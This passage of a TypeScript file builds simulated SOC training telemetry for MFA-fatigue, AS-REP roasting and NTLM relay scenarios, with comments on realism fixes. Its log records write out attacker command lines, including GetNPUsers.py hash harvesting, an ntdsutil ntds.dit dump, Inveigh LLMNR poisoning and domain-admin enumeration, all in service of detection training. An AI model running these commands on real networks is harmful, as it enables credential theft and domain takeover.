      id: "mfa_10_inbox_rule",
      ts: T(24 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
      event_type: "account_modify", severity: "high", mitre_technique: "T1114.003",
      hostname: "outlook.office365.com", user_email: "j.chen@nexacorp.com", src_ip: "91.108.4.33",
      description: "An inbox rule forwarding all of j.chen's email to j.chen.backup@proton.me and marking it as read was created.",
      raw: {
        "data.office365.Operation": "New-InboxRule",
        "data.office365.UserId": "j.chen@nexacorp.com",
        "data.office365.Workload": "Exchange",
        "data.office365.ClientIPAddress": "91.108.4.33",
        "data.office365.Parameters[0].Name": "ForwardTo",
        "data.office365.Parameters[0].Value": "j.chen.backup@proton.me",
        "data.office365.Parameters[1].Name": "MarkAsRead",
        "data.office365.Parameters[1].Value": "True",
        "GeoLocation.country_name": "Russia",
      },
    },
    {
      // The SIEM correlation record. Okta writes ONE user.session.start /
      // push_response event per attempt (see the "Representative record" notes
      // above) — the 47/12/60 totals that make this MFA fatigue rather than one
      // denied push are SIEM-side aggregates, never a field on a single Okta
      // record, and (since F-02) the analyst-facing `description` that used to
      // state them is stripped during the investigation. Without a structured
      // place for the counts to live, the sweep pattern was unverifiable from the
      // visible telemetry alone — an analyst could still guess the right multiple
      // -choice option, but could not confirm it, from data. This event puts the
      // counts where a real Sentinel analytics rule actually would: as fields on
      // its own correlation record — the same pattern already used for the
      // backup-agent false-positive scenario's HighVolumeFileAccess_SingleAccount
      // rule (evt_bkpfp_10_correlation).
      id: "mfa_11_correlation",
      ts: T(25 * MIN),
      source: "siem", vendor: "Microsoft Sentinel",
      event_type: "ueba_anomaly", severity: "high", mitre_technique: "T1621", mitre_tactic: "Credential Access",
      hostname: "okta-idp.nexacorp.com", user_email: "j.chen@nexacorp.com", src_ip: "91.108.4.33",
      description: "Sentinel rule MFAFatigue_ExcessivePushWithSuccess correlated j.chen's Okta activity across a 764-second window ending at the approved push.",
      raw: {
        "AlertName": "MFAFatigue_ExcessivePushWithSuccess",
        "alert.rule.id": "SEN-MFA-0114",
        "target.user.name": "j.chen@nexacorp.com",
        "host.name": "okta-idp.nexacorp.com",
        "ExtendedProperties.Window Start": T(0),
        "ExtendedProperties.Window End": T(12 * MIN + 44_000),
        "ExtendedProperties.Time window (s)": 764,
        "ExtendedProperties.Auth Failure Count": 47,
        "ExtendedProperties.MFA Push Denied Count": 12,
        "ExtendedProperties.MFA Push Total Count": 60,
        "ExtendedProperties.MFA Push Approved Count": 1,
        "ExtendedProperties.Source Country": "Russia",
        "ExtendedProperties.Source IP": "91.108.4.33",
        "event.action": "correlation-alert",
        "event.outcome": "alerted",
      },
    },
  ];

  return { title: "MFA Fatigue → Okta Account Takeover", events, T, MIN };
}

/** Telemetry half of `buildAsRepRoastingScenario`: the events and the story title, no answer key. */
export function asRepRoastingScenarioEvents() {
  // The Python interpreter hosting the Impacket module — the one artefact in an
  // otherwise entirely internal AD attack that an analyst can actually look up.
  const pyHash = makeSha256("python_exe_impacket_host");
  const B = new Date("2026-05-10T09:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const HOUR = 60 * MIN;

  const events: TelemetryEvent[] = [
    // ── Foothold: the interactive session every later workstation row hangs off ──
    // The process rows below run under this logon; the 4768s and the later
    // svc-backup logons all name this workstation's address.
    {
      id: "asrep_00_logon",
      ts: T(-25 * MIN),
      source: "ad", vendor: "Windows Security",
      event_type: "auth_success", severity: "informational",
      hostname: "WS-DEV-09", user_email: "m.johnson@nexacorp.com", src_ip: "10.0.1.45",
      description: "m.johnson logged on interactively (Type 2) to WS-DEV-09.",
      raw: {
        "event.code": "4624",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.computer_name": "WS-DEV-09",
        "winlog.event_data.TargetUserName": "m.johnson",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.LogonType": "2",
        "winlog.event_data.LogonProcessName": "User32",
        "winlog.event_data.AuthenticationPackageName": "Kerberos",
        "winlog.event_data.WorkstationName": "WS-DEV-09",
        "winlog.event_data.IpAddress": "10.0.1.45",
      },
    },
    // The process that issues the AS requests starts a few seconds before
    // the DC logs the first of them (the tool cannot start after the tickets
    // it requests were granted).
    {
      id: "asrep_05_impacket_tool",
      ts: T(-5_000),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "process_create", severity: "high", mitre_technique: "T1558.004",
      hostname: "WS-DEV-09", user_email: "m.johnson@nexacorp.com",
      description: "python.exe on WS-DEV-09 ran GetNPUsers.py under m.johnson against nexacorp.local, with an output file in m.johnson's Temp folder.",
      fp_explanation: "Python scripts run constantly on developer machines. 'GetNPUsers' isn't a well-known household tool name — many junior analysts don't recognize it as an Impacket attack module.",
      // The process is the interpreter; the script is its argument (a .py never runs as an image).
      process: {
        name: "python.exe", pid: 7716, parent_name: "cmd.exe",
        path: "C:\\Users\\m.johnson\\AppData\\Local\\Programs\\Python\\Python312\\python.exe",
        cmdline: "python.exe C:\\Users\\m.johnson\\AppData\\Local\\Temp\\impacket\\GetNPUsers.py nexacorp.local/ -no-pass -usersfile C:\\Users\\m.johnson\\AppData\\Local\\Temp\\users.txt -format hashcat -outputfile C:\\Users\\m.johnson\\AppData\\Local\\Temp\\asrep_hashes.txt",
      },
      raw: {
        "crowdstrike.process_name": "python.exe",
        "crowdstrike.CommandLine": "python.exe C:\\Users\\m.johnson\\AppData\\Local\\Temp\\impacket\\GetNPUsers.py nexacorp.local/ -no-pass -usersfile C:\\Users\\m.johnson\\AppData\\Local\\Temp\\users.txt -format hashcat -outputfile C:\\Users\\m.johnson\\AppData\\Local\\Temp\\asrep_hashes.txt",
        "crowdstrike.FileName": "python.exe",
        "crowdstrike.SHA256": pyHash,
        "crowdstrike.FilePath": "C:\\Users\\m.johnson\\AppData\\Local\\Programs\\Python\\Python312\\",
        "crowdstrike.UserName": "NEXACORP\\m.johnson",
        "crowdstrike.parent_basefilename": "cmd.exe",
        "crowdstrike.local_address": "10.0.1.45",
        "crowdstrike.remote_address": "10.0.0.5",
        "crowdstrike.remote_port": "88",
        "crowdstrike.Severity": 70,
      },
    },
    {
      id: "asrep_02_asrep_svcbackup",
      ts: T(2 * MIN),
      source: "ad", vendor: "Windows Security",
      event_type: "kerberos_tgt", severity: "high", mitre_technique: "T1558.004",
      hostname: "DC01", user_email: "svc-backup@nexacorp.com", src_ip: "10.0.1.45",
      description: "DC01 logged a Kerberos TGT request (4768) for svc-backup from 10.0.1.45 with PreAuthType 0 and ticket encryption 0x17.",
      raw: {
        "event.code": "4768",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.computer_name": "DC01",
        "winlog.event_data.TargetUserName": "svc-backup",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.ServiceName": "krbtgt",
        "winlog.event_data.TicketEncryptionType": "0x17",
        "winlog.event_data.TicketOptions": "0x40800010",
        "winlog.event_data.Status": "0x0",
        "winlog.event_data.PreAuthType": "0",
        "winlog.event_data.IpAddress": "10.0.1.45",
        "winlog.event_data.IpPort": "52341",
      },
    },
    {
      id: "asrep_06_kerberos_network",
      ts: T(2 * MIN + 5_000),
      source: "ids", vendor: "Corelight (Zeek)",
      event_type: "net_connection", severity: "medium", mitre_technique: "T1558.004",
      hostname: "WS-DEV-09", src_ip: "10.0.1.45", dst_ip: "10.0.0.5", dst_port: 88,
      description: "Zeek logged 3 rapid Kerberos AS requests (UDP/88, RC4-HMAC) from WS-DEV-09 to DC01 within seconds of each other.",
      raw: {
        "network.protocol": "kerberos",
        "network.transport": "udp",
        "destination.port": 88,
        "source.ip": "10.0.1.45",
        "destination.ip": "10.0.0.5",
        "network.bytes": 1872,
        "network.packets": 6,
        "zeek.kerberos.request_type": "AS",
        "zeek.kerberos.encryption_type": "rc4-hmac",
      },
    },
    {
      id: "asrep_03_asrep_svcmonitoring",
      ts: T(2 * MIN + 15_000),
      source: "ad", vendor: "Windows Security",
      event_type: "kerberos_tgt", severity: "high", mitre_technique: "T1558.004",
      hostname: "DC01", user_email: "svc-monitoring@nexacorp.com", src_ip: "10.0.1.45",
      description: "DC01 issued a second PreAuthType=0, RC4-encrypted AS-REP, this time for svc-monitoring, 15 seconds after svc-backup.",
      raw: {
        "event.code": "4768",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.computer_name": "DC01",
        "winlog.event_data.TargetUserName": "svc-monitoring",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.ServiceName": "krbtgt",
        "winlog.event_data.TicketEncryptionType": "0x17",
        "winlog.event_data.Status": "0x0",
        "winlog.event_data.PreAuthType": "0",
        "winlog.event_data.IpAddress": "10.0.1.45",
        "winlog.event_data.IpPort": "52342",
      },
    },
    {
      id: "asrep_04_asrep_svcreports",
      ts: T(2 * MIN + 30_000),
      source: "ad", vendor: "Windows Security",
      event_type: "kerberos_tgt", severity: "high", mitre_technique: "T1558.004",
      hostname: "DC01", user_email: "svc-reports@nexacorp.com", src_ip: "10.0.1.45",
      description: "A third PreAuthType=0, RC4-encrypted AS-REP was issued for svc-reports, 15 seconds after svc-monitoring.",
      raw: {
        "event.code": "4768",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.computer_name": "DC01",
        "winlog.event_data.TargetUserName": "svc-reports",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.ServiceName": "krbtgt",
        "winlog.event_data.TicketEncryptionType": "0x17",
        "winlog.event_data.Status": "0x0",
        "winlog.event_data.PreAuthType": "0",
        "winlog.event_data.IpAddress": "10.0.1.45",
        "winlog.event_data.IpPort": "52343",
      },
    },
    // ── First alert: Defender for Identity, after the three AS exchanges it reports ──
    // REPLACES asrep_01, an "LDAP query" logged as a DC 4662 — a DC writes no
    // record of a client's LDAP search filter. The directory-side evidence a SOC
    // really gets is the identity sensor's alert on the AS exchanges themselves,
    // shown as it lands in the SIEM (SecurityAlert): the alert name and its
    // entities — source computer, source address, the accounts targeted.
    {
      id: "asrep_01_mdi_alert",
      ts: T(3 * MIN + 10_000),
      source: "ad", vendor: "Microsoft Defender for Identity",
      event_type: "ids_signature", severity: "high", mitre_technique: "T1558.004", mitre_tactic: "Credential Access",
      is_detection: true,
      hostname: "WS-DEV-09", src_ip: "10.0.1.45",
      description: "Defender for Identity raised 'Suspected AS-REP Roasting attack' with source WS-DEV-09 (10.0.1.45) and target accounts svc-backup, svc-monitoring and svc-reports.",
      raw: {
        "TimeGenerated": T(3 * MIN + 10_000),
        "AlertName": "Suspected AS-REP Roasting attack",
        "AlertSeverity": "High",
        "ProductName": "Azure Advanced Threat Protection",
        "VendorName": "Microsoft",
        "SystemAlertId": "6f1c2b7e-4a9d-4e31-9b52-0c8e7d14a3f6",
        "Status": "New",
        "StartTime": T(2 * MIN),
        "EndTime": T(2 * MIN + 30_000),
        "Tactics": "CredentialAccess",
        "Techniques": "[\"T1558\"]",
        "CompromisedEntity": "WS-DEV-09",
        "Entities": JSON.stringify([
          { $id: "2", HostName: "WS-DEV-09", DnsDomain: "nexacorp.com", Type: "host" },
          { $id: "3", Address: "10.0.1.45", Type: "ip" },
          { $id: "4", Name: "svc-backup", NTDomain: "NEXACORP", Type: "account" },
          { $id: "5", Name: "svc-monitoring", NTDomain: "NEXACORP", Type: "account" },
          { $id: "6", Name: "svc-reports", NTDomain: "NEXACORP", Type: "account" },
          { $id: "7", HostName: "DC01", DnsDomain: "nexacorp.com", Type: "host" },
        ]),
      },
    },
    {
      id: "asrep_07_lateral_svcbackup",
      ts: T(6 * HOUR),
      source: "ad", vendor: "Windows Security",
      event_type: "auth_success", severity: "high", mitre_technique: "T1078.002",
      hostname: "SRV-FILE01", user_email: "svc-backup@nexacorp.com", src_ip: "10.0.1.45",
      description: "svc-backup authenticated to SRV-FILE01 via a network logon (Type 3) originating from WS-DEV-09.",
      raw: {
        "event.code": "4624",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.computer_name": "SRV-FILE01",
        "winlog.event_data.TargetUserName": "svc-backup",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.LogonType": "3",
        "winlog.event_data.AuthenticationPackageName": "NTLM",
        "winlog.event_data.WorkstationName": "WS-DEV-09",
        "winlog.event_data.IpAddress": "10.0.1.45",
        "winlog.event_data.IpPort": "54219",
      },
    },
    {
      id: "asrep_08_sebackupprivilege",
      ts: T(6 * HOUR + 1 * MIN),
      source: "ad", vendor: "Windows Security",
      event_type: "privileged_operation", severity: "critical", mitre_technique: "T1078.002",
      hostname: "SRV-FILE01", user_email: "svc-backup@nexacorp.com",
      description: "The svc-backup logon session on SRV-FILE01 was assigned SeBackupPrivilege, SeRestorePrivilege, and SeCreateSymbolicLinkPrivilege.",
      raw: {
        "event.code": "4672",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.computer_name": "SRV-FILE01",
        "winlog.event_data.SubjectUserName": "svc-backup",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.PrivilegeList": "SeBackupPrivilege\tSeRestorePrivilege\tSeCreateSymbolicLinkPrivilege",
      },
    },
    {
      id: "asrep_09_domain_admin_enum",
      ts: T(6 * HOUR + 5 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "process_create", severity: "high", mitre_technique: "T1087.002",
      hostname: "SRV-FILE01", user_email: "svc-backup@nexacorp.com",
      description: "svc-backup ran net group \"Domain Admins\" /domain on SRV-FILE01.",
      raw: {
        "crowdstrike.process_name": "net.exe",
        "crowdstrike.CommandLine": "net group \"Domain Admins\" /domain",
        "crowdstrike.UserName": "NEXACORP\\svc-backup",
        "crowdstrike.parent_basefilename": "cmd.exe",
        "crowdstrike.local_address": "10.0.2.20",
        "crowdstrike.Severity": 65,
      },
    },
    // ── The DC access the NTDS dump requires ────────────────────────────────
    //
    // ADDED. asrep_08 grants SeBackupPrivilege on SRV-FILE01, and asrep_10 then
    // runs ntdsutil on DC01. A privilege held on a file server confers nothing
    // on a domain controller — and no event showed svc-backup reaching DC01 at
    // all, so the final and most damaging step had no prerequisite.
    //
    // Worse than a missing event: q3's explanation invited the student to infer
    // that the file-server privilege enabled the DC dump. The generic claim
    // about SeBackupPrivilege is true; the chain the scenario implied was not.
    //
    // Making it explicit also sharpens the real lesson. Over-privileged backup
    // service accounts holding rights on domain controllers are exactly why
    // this attack matters, and that is now visible rather than assumed.
    {
      id: "asrep_09b_dc_logon",
      ts: T(6 * HOUR + 12 * MIN),
      source: "ad", vendor: "Windows Security",
      event_type: "auth_success", severity: "high", mitre_technique: "T1078",
      hostname: "DC01", user_email: "svc-backup@nexacorp.com", src_ip: "10.0.2.20",
      description: "svc-backup authenticated to DC01 with a network logon (Type 3) from SRV-FILE01, and the session was assigned SeBackupPrivilege and SeRestorePrivilege.",
      raw: {
        "event.code": "4624",
        "winlog.channel": "Security",
        "winlog.computer_name": "DC01.nexacorp.com",
        "winlog.event_data.TargetUserName": "svc-backup",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.LogonType": "3",
        "winlog.event_data.AuthenticationPackageName": "Kerberos",
        "winlog.event_data.IpAddress": "10.0.2.20",
        "winlog.event_data.TargetLogonId": "0x7A31C09",
        // The 4672 that accompanies it — this is the account's standing
        // entitlement on the DC, not something the attacker granted.
        "winlog.event_data.PrivilegeList": "SeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeSecurityPrivilege",
        // Group-membership / tenure context ("Backup Operators", since 2023-08-14)
        // is directory-service correlation metadata, not something a raw 4624
        // record carries — moved out of `raw` rather than given a fabricated
        // Windows Security field name.
      },
    },
    {
      id: "asrep_10_ntds_dump",
      ts: T(6 * HOUR + 20 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "file_create", severity: "critical", mitre_technique: "T1003.003",
      hostname: "DC01", user_email: "svc-backup@nexacorp.com",
      description: "ntdsutil.exe running as svc-backup on DC01 wrote ntds.dit to C:\\Temp\\ntds_dump\\Active Directory\\.",
      // The file write needs its path and writer as event facts for the EDR
      // record to render (it rendered nothing from the vendor keys alone).
      process: {
        name: "ntdsutil.exe", pid: 6412, path: "C:\\Windows\\System32\\ntdsutil.exe",
        cmdline: "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full C:\\Temp\\ntds_dump\" q q",
        user: "NEXACORP\\svc-backup",
      },
      file: { name: "ntds.dit", path: "C:\\Temp\\ntds_dump\\Active Directory\\ntds.dit", size: 51380224 },
      raw: {
        "crowdstrike.process_name": "ntdsutil.exe",
        "crowdstrike.CommandLine": "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full C:\\Temp\\ntds_dump\" q q",
        "crowdstrike.UserName": "NEXACORP\\svc-backup",
        "crowdstrike.target_filename": "C:\\Temp\\ntds_dump\\Active Directory\\ntds.dit",
        "crowdstrike.filesize": 51380224,
        "crowdstrike.Severity": 95,
      },
    },
  ];

  return { title: "AS-REP Roasting → Offline Hash Crack", events, T, MIN, HOUR };
}

/** Telemetry half of `buildNtlmRelayScenario`: the events and the story title, no answer key. */
export function ntlmRelayScenarioEvents() {
  const B = new Date("2026-05-14T10:12:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const events: TelemetryEvent[] = [
    // ── Foothold: the session the poisoner runs under ───────────────────────
    {
      id: "ntlm_00_logon",
      ts: T(-40 * MIN),
      source: "ad", vendor: "Windows Security",
      event_type: "auth_success", severity: "informational",
      hostname: "WS-DEV-09", user_email: "m.johnson@nexacorp.com", src_ip: "10.0.1.45",
      description: "m.johnson logged on interactively (Type 2) to WS-DEV-09.",
      raw: {
        "event.code": "4624",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.computer_name": "WS-DEV-09",
        "winlog.event_data.TargetUserName": "m.johnson",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.LogonType": "2",
        "winlog.event_data.LogonProcessName": "User32",
        "winlog.event_data.AuthenticationPackageName": "Kerberos",
        "winlog.event_data.WorkstationName": "WS-DEV-09",
        "winlog.event_data.IpAddress": "10.0.1.45",
      },
    },
    // Inveigh has to be listening before it can answer the LLMNR broadcast
    // below — its process_create was timestamped T+1s, a full second AFTER
    // that broadcast, which has the poisoner starting after the packet it
    // poisons. Moved ahead of it and given a small negative offset.
    {
      id: "ntlm_04_responder_detected",
      ts: T(-10_000),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "process_create", severity: "critical", mitre_technique: "T1557.001",
      hostname: "WS-DEV-09", user_email: "m.johnson@nexacorp.com",
      // Was `python3.exe` running `Responder.py -I eth0` on a WINDOWS host.
      // eth0 is a Linux interface name, the Windows Python binary is
      // python.exe, and Responder needs to bind UDP 137/138/5355 and TCP
      // 445/139 — which LanmanServer already holds on Windows. Inveigh is the
      // Windows-native equivalent and does exactly this job.
      description: "Inveigh.exe started on WS-DEV-09 under m.johnson's account with LLMNR, NBNS and SMB listeners enabled.",
      raw: {
        "crowdstrike.process_name": "Inveigh.exe",
        "crowdstrike.CommandLine": "Inveigh.exe -LLMNR Y -NBNS Y -SMB Y -Inspect N -FileOutput Y",
        "crowdstrike.FileName": "Inveigh.exe",
        "crowdstrike.FilePath": "C:\\Users\\m.johnson\\AppData\\Local\\Temp\\",
        "crowdstrike.UserName": "NEXACORP\\m.johnson",
        "crowdstrike.parent_basefilename": "powershell.exe",
        "crowdstrike.local_address": "10.0.1.45",
        // Same process as the alert ntlm_04b — one pid on both records.
        "crowdstrike.RawProcessId": "5976",
        "crowdstrike.Severity": 95,
        "crowdstrike.SHA256": makeSha256("inveigh_exe_llmnr_poisoner"),
      },
    },
    // ── First alert: the EDR's behavioural detection on that process ──────────
    // The page a SOC actually gets, seconds after the process start and before
    // any victim traffic. Detect-only policy on this host group: the process
    // keeps running, which is why the relay below still happens.
    {
      id: "ntlm_04b_edr_alert",
      ts: T(-6_000),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "edr_alert", severity: "critical", mitre_technique: "T1557.001", mitre_tactic: "Credential Access",
      is_detection: true,
      hostname: "WS-DEV-09", user_email: "m.johnson@nexacorp.com", src_ip: "10.0.1.45",
      process: {
        name: "Inveigh.exe", pid: 5976, path: "C:\\Users\\m.johnson\\AppData\\Local\\Temp\\Inveigh.exe", parent_name: "powershell.exe",
        cmdline: "Inveigh.exe -LLMNR Y -NBNS Y -SMB Y -Inspect N -FileOutput Y",
        user: "NEXACORP\\m.johnson", integrity: "medium",
        hash: { sha256: makeSha256("inveigh_exe_llmnr_poisoner") },
      },
      description: "The EDR raised a critical alert on WS-DEV-09 for Inveigh.exe (user m.johnson, parent powershell.exe); the policy action was detect-only.",
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
        "crowdstrike.detection.scenario": "credential_theft",
        "crowdstrike.detection.tactic": "Credential Access",
        "crowdstrike.detection.tactic_id": "TA0006",
        "crowdstrike.detection.technique": "LLMNR/NBT-NS Poisoning and SMB Relay",
        "crowdstrike.detection.technique_id": "T1557.001",
        "crowdstrike.detection.severity": "Critical",
        "crowdstrike.detection.pattern_disposition": "0",
        "crowdstrike.detection.pattern_disposition_description": "Detection, standard detection.",
        "crowdstrike.detection.process_tree": "explorer.exe > powershell.exe > Inveigh.exe",
        "host.name": "WS-DEV-09",
        "action_result": "detected",
      },
    },
    {
      id: "ntlm_01_llmnr_broadcast",
      ts: T(0),
      source: "firewall", vendor: "FortiGate",
      event_type: "net_connection", severity: "low", mitre_technique: "T1557.001",
      hostname: "WS-FIN-03", src_ip: "10.0.1.31", dst_ip: "224.0.0.252", dst_port: 5355,
      description: "WS-FIN-03 sent an LLMNR UDP broadcast (port 5355) to 224.0.0.252, attempting to resolve a share name that DNS could not resolve.",
      fp_explanation: "LLMNR UDP 5355 multicasts are extremely common in Windows networks — almost every misconfigured machine generates them for typo'd share names. This looks like routine name resolution noise.",
      raw: {
        "data.type": "traffic",
        "data.subtype": "forward",
        "data.srcip": "10.0.1.31",
        "data.dstip": "224.0.0.252",
        "data.dstport": "5355",
        "data.proto": "17",
        "data.action": "accept",
        "data.app": "LLMNR",
        "data.sentbyte": 72,
        "data.rcvdbyte": 0,
      },
    },
    {
      id: "ntlm_02_llmnr_response",
      ts: T(2_000),
      source: "firewall", vendor: "FortiGate",
      event_type: "net_connection", severity: "low", mitre_technique: "T1557.001",
      hostname: "WS-DEV-09", src_ip: "10.0.1.45", dst_ip: "10.0.1.31", dst_port: 5355,
      description: "WS-DEV-09 sent a unicast LLMNR response directly to WS-FIN-03 two seconds later, claiming to be the requested host.",
      fp_explanation: "A UDP response on 5355 from another workstation could be legitimate name resolution. This pattern only becomes suspicious when correlated with the subsequent auth failure.",
      raw: {
        "data.type": "traffic",
        "data.subtype": "forward",
        "data.srcip": "10.0.1.45",
        "data.dstip": "10.0.1.31",
        "data.dstport": "5355",
        "data.proto": "17",
        "data.action": "accept",
        "data.app": "LLMNR",
        "data.sentbyte": 88,
        "data.rcvdbyte": 0,
      },
    },
    {
      // REPLACED a 4625 that could not exist. The previous version put a failed
      // NTLM logon on WS-DEV-09 with SubStatus 0xC000006A (wrong password).
      //
      // Two problems. In a relay the victim's NTLM blob is consumed by the
      // attacker's userland tooling and never handed to the local LSA, so
      // Windows writes no authentication record at all on that host. And
      // 0xC000006A asserts the credential WAS validated and found wrong —
      // three seconds before the same credential succeeds on SRV-FILE01. That
      // pushed the analyst toward cracking or spraying, which is the wrong
      // technique family entirely.
      //
      // What the victim actually leaves is an SMB session to the poisoner.
      id: "ntlm_03_victim_smb_session",
      ts: T(5_000),
      source: "ids", vendor: "Corelight (Zeek)",
      event_type: "net_connection", severity: "medium", mitre_technique: "T1557.001",
      hostname: "WS-FIN-03", user_email: "l.nguyen@nexacorp.com", src_ip: "10.0.1.31",
      description: "WS-FIN-03 opened an SMB session to 10.0.1.45 on port 445, three seconds after receiving the LLMNR answer.",
      fp_explanation: "Workstation-to-workstation SMB is unusual but not unheard of on this network — a developer sharing a build folder produces the same shape.",
      raw: {
        "zeek.log_type": "smb_mapping",
        "zeek.uid": "CmZ8k24Xb9pQwL3vTf",
        "id.orig_h": "10.0.1.31",
        "id.orig_p": "49821",
        "id.resp_h": "10.0.1.45",
        "id.resp_p": "445",
        "smb.path": "\\\\10.0.1.45\\FINANCE-ARCHIVE",
        "smb.share_type": "DISK",
        "smb.native_file_system": "",
        "network.transport": "tcp",
      },
    },
    {
      id: "ntlm_05_relay_auth_success",
      ts: T(8_000),
      source: "ad", vendor: "Windows Security",
      event_type: "auth_success", severity: "high", mitre_technique: "T1078",
      hostname: "SRV-FILE01", user_email: "l.nguyen@nexacorp.com", src_ip: "10.0.1.45",
      description: "l.nguyen authenticated to SRV-FILE01 with a network logon (Type 3) over NTLM. The record names WS-FIN-03 as the workstation and 10.0.1.45 as the source address.",
      raw: {
        "event.code": "4624",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.computer_name": "SRV-FILE01",
        "winlog.event_data.TargetUserName": "l.nguyen",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.LogonType": "3",
        "winlog.event_data.AuthenticationPackageName": "NTLM",
        // THE relay signature, and it was previously inverted.
        //
        // ntlmrelayx forwards the victim's NTLMSSP_AUTH message verbatim — it
        // cannot rewrite the workstation name without invalidating the MIC. So
        // the relayed 4624 names the VICTIM's machine (WS-FIN-03) while the
        // packet arrives from the ATTACKER's address (10.0.1.45).
        //
        // That contradiction inside a single record is the highest-fidelity
        // relay indicator there is. This event previously carried WS-DEV-09 in
        // both fields, which is what a normal logon from that host would look
        // like — teaching the exact opposite of the tell.
        "winlog.event_data.WorkstationName": "WS-FIN-03",
        "winlog.event_data.IpAddress": "10.0.1.45",
        "winlog.event_data.IpPort": "49823",
        "winlog.event_data.LmPackageName": "NTLM V2",
        "winlog.event_data.KeyLength": "128",
      },
    },
    {
      id: "ntlm_06_psexec_service",
      ts: T(15 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "service_install", severity: "critical", mitre_technique: "T1021.002",
      hostname: "SRV-FILE01", user_email: "l.nguyen@nexacorp.com",
      description: "PSEXESVC.exe was installed as a service on SRV-FILE01, launched under the relayed l.nguyen credentials.",
      raw: {
        "crowdstrike.process_name": "PSEXESVC.exe",
        "crowdstrike.parent_basefilename": "services.exe",
        "crowdstrike.FileName": "PSEXESVC.exe",
        "crowdstrike.FilePath": "C:\\Windows\\",
        "crowdstrike.UserName": "NEXACORP\\l.nguyen",
        "crowdstrike.SHA256": makeSha256("PSEXESVC-ntlm-relay-2026"),
        "crowdstrike.Severity": 90,
      },
    },
    {
      id: "ntlm_07_system_logon",
      ts: T(15 * MIN + 3_000),
      source: "ad", vendor: "Windows Security",
      event_type: "auth_success", severity: "high", mitre_technique: "T1021.002",
      hostname: "SRV-FILE01",
      description: "A LogonType 5 (Service) logon for NT AUTHORITY\\SYSTEM was recorded on SRV-FILE01, three seconds after PSEXESVC.exe was installed.",
      raw: {
        "event.code": "4624",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.computer_name": "SRV-FILE01",
        "winlog.event_data.TargetUserName": "SYSTEM",
        "winlog.event_data.TargetDomainName": "NT AUTHORITY",
        "winlog.event_data.LogonType": "5",
        "winlog.event_data.LogonProcessName": "Advapi",
        "winlog.event_data.AuthenticationPackageName": "Negotiate",
      },
    },
    {
      id: "ntlm_08_domain_recon",
      ts: T(16 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "process_create", severity: "high", mitre_technique: "T1087.002",
      hostname: "SRV-FILE01",
      description: "net user /domain ran on SRV-FILE01 under NT AUTHORITY\\SYSTEM, spawned from cmd.exe.",
      raw: {
        "crowdstrike.process_name": "net.exe",
        "crowdstrike.CommandLine": "net user /domain",
        "crowdstrike.parent_basefilename": "cmd.exe",
        "crowdstrike.parent_commandline": "cmd.exe /c net user /domain",
        "crowdstrike.UserName": "NT AUTHORITY\\SYSTEM",
        "crowdstrike.local_address": "10.0.2.20",
        "crowdstrike.Severity": 60,
      },
    },
    {
      id: "ntlm_09_lsass_dump",
      ts: T(18 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "process_access", severity: "critical", mitre_technique: "T1003.001",
      hostname: "SRV-FILE01",
      // No hard-coded lsass PID: the EDR record prints the host's own lsass.exe
      // process id (one per host per boot), and "PID 688" contradicted it.
      description: "cmd.exe running as NT AUTHORITY\\SYSTEM on SRV-FILE01 opened a handle to lsass.exe with GrantedAccess 0x1FFFFF.",
      raw: {
        "crowdstrike.target_imagefilename": "lsass.exe",
        "crowdstrike.GrantedAccess": "0x1FFFFF",
        "crowdstrike.process_name": "cmd.exe",
        "crowdstrike.UserName": "NT AUTHORITY\\SYSTEM",
        "crowdstrike.Severity": 95,
      },
    },
    {
      id: "ntlm_10_lateral_smb",
      ts: T(25 * MIN),
      source: "firewall", vendor: "FortiGate",
      event_type: "net_connection", severity: "critical", mitre_technique: "T1021.002",
      hostname: "SRV-FILE01", src_ip: "10.0.2.20", dst_ip: "10.0.2.30", dst_port: 445,
      // Was ONE record carrying `data.dstip: "10.0.2.30,10.0.2.31,10.0.0.5"` and
      // `data.msg: "SMB lateral movement to multiple targets"`. FortiGate writes
      // one record per session — dstip is never a list — and a traffic log does
      // not editorialise. That msg field also handed over the conclusion this
      // event exists for the analyst to reach. Split into three real sessions;
